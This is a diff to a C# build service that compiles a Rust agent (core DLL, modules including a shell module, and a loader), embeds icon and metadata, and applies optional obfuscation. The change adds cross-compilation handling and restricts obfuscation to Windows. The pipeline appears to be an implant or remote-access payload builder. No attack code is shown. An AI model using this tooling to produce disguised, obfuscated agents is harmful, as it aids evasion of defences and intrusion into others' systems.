@@ -20,6 +20,7 @@ internal class BuildContext
     public string ModuleExt { get; set; } = "dll";
     public bool IsWindows { get; set; }
     public bool IsMacos { get; set; }
+    public bool IsCross { get; set; }
     public Dictionary<string, string> EnvVars { get; set; } = new();
     public string CoreDllPath { get; set; } = "";
     public string ExePath { get; set; } = "";
@@ -37,7 +38,7 @@ public partial class BuilderBuildService
     private static async Task Stage1_BuildCoreAsync(BuildContext ctx, string targetArg, BuildJob job)
     {
         job.Log($"=== Stage 1: Building Core DLL ({ctx.TargetTriple}) ===");
-        var coreBuildArgs = $"build --release {targetArg} -p core --target-dir \"{ctx.TargetDir}\"";
+        var coreBuildArgs = $"build{BuilderBuildService.CargoBuildCommand(ctx, targetArg, "-p core")}";
         job.Log($"cargo {coreBuildArgs}");
 
         var coreBuildResult = await RunProcessAsync("cargo", coreBuildArgs, job, RustAgentDir, ctx.EnvVars);
@@ -113,7 +114,7 @@ public partial class BuilderBuildService
             .Select(m => m.Lib.StartsWith("shell_") ? "-p shell-module" : $"-p {m.Module}-module")
             .Distinct());
 
-        var moduleBuildArgs = $"build --release {targetArg} {packages} --target-dir \"{ctx.TargetDir}\"";
+        var moduleBuildArgs = $"build{BuilderBuildService.CargoBuildCommand(ctx, targetArg, packages)}";
         var moduleBuildResult = await RunProcessAsync("cargo", moduleBuildArgs, job, RustAgentDir, ctx.EnvVars);
         if (moduleBuildResult.ExitCode != 0)
         {
@@ -216,7 +217,7 @@ public partial class BuilderBuildService
         {
             // ── First time: compile loader and save as template ──
             job.Log("No template found, compiling loader from source...");
-            var loaderBuildArgs = $"build --release {targetArg} {featuresArg} -p loader --target-dir \"{ctx.TargetDir}\"";
+            var loaderBuildArgs = $"build{BuilderBuildService.CargoBuildCommand(ctx, targetArg, $"{featuresArg} -p loader")}";
             job.Log($"cargo {loaderBuildArgs}");
 
             var loaderBuildResult = await RunProcessAsync("cargo", loaderBuildArgs, job, RustAgentDir, ctx.EnvVars);
@@ -260,8 +261,8 @@ public partial class BuilderBuildService
             await EmbedIconAndMetadata(ctx.Req, exePath, job);
         }
 
-        // ── Goldberg obfuscation ──
-        if (ctx.Req.EnableObfuscation)
+        // ── Goldberg obfuscation (Windows PE only) ──
+        if (ctx.IsWindows && ctx.Req.EnableObfuscation)
         {
             job.Log("Running goldberg obfuscation...");
             try
